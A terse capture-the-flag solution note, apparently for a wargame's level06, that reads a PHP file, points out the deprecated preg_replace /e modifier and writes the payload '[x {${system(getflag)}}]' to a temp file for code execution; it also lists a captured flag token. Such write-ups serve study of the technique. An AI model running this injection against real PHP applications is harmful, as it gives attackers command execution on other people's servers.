
#flag
#token wiok45aaoguiboiki2tuin6ub

ls -la
cat level06.php

$a = preg_replace("/(\[x (.*)\])/e" 

/e modifier allows execution of PHP code in the replacement string

echo '[x {${system(getflag)}}]' > /tmp/exploit.txt

execute
